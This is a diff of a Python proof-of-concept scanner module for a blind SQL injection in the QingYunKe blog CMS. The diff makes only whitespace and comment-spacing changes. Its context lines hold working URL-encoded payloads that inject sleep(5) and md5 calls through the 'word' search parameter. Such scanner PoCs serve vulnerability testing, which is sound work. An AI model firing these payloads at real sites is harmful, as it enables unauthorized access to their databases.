@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'QYKCMS_0001' # 平台漏洞编号，留空
+    vuln_id = 'QYKCMS_0001'  # 平台漏洞编号，留空
     name = '青云客博客CMS SQL盲注'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2016-04-15'  # 漏洞公布时间
     desc = '''
         在include/class_temp.php中
@@ -33,7 +34,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload_sleep = "/?log=blog&seartype=title&word=%E9%9C%87%E6%92%BC%22%20and%20geometrycollection((select%20*from(select%20*%20from%20(select%20sleep%20(5))a)b))%20and%20%221%22=%221"
             payload_normal = "/?log=blog&seartype=title&word=%E9%9C%87%E6%92%BC%22%20and%20geometrycollection((select%20*from(select%20*%20from%20(select%20md5%20(c))a)b))%20and%20%221%22=%221"
             url_sleep = self.target + payload_sleep
@@ -53,6 +54,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
